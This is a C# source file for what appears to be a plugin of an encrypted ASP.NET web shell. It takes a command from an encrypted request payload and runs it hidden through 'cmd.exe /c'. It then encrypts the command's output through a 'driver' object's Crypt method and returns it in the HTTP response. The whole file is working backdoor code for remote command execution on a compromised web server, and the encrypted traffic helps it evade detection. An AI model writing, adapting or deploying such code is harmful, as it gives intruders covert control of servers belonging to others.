using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;

public class Cmd
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            string szAction = dic.ContainsKey("action") ? dic["action"].ToUpper() : string.Empty;

            if (szAction.Equals("CMD"))
            {
                string szCmd = dic.ContainsKey("cmd") ? dic["cmd"] : string.Empty;
                string szOutput = "";

                if (string.IsNullOrEmpty(szCmd))
                    return true;

                ProcessStartInfo psi = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + szCmd,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process proc = Process.Start(psi))
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();
                    
                    szOutput = stdout + stderr;
                }

                byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
                byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});

                response.Clear();
                response.ContentType = "application/octet-stream";
                response.BinaryWrite(abEncryptedResp);
            }
        }
        catch (Exception ex)
        {
            response.Write("CMD_RUN_ERROR: " + ex.Message);
        }

        return true;
    }
}